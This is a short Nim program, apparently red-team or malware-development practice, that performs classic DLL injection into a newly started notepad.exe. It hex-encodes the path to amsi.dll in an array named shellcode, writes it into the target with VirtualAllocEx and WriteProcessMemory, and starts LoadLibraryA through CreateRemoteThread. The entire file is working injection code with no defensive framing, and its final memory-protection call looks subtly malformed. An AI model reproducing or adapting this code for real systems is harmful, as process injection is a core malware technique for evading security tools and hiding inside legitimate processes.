import winim
import osproc

proc injectCreateRemoteThread(): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    #tProcess.suspend() # That's handy!
    #defer: tProcess.close()

    # C:\windows\system32\amsi.dll
    var shellcode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        addr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    
    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
 
    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        pfnThreadRtn,
        rPtr, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

    var oldProtect: PDWORD = nil
    var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
    echo $GetLastError()
    echo status

when isMainModule:
    injectCreateRemoteThread()
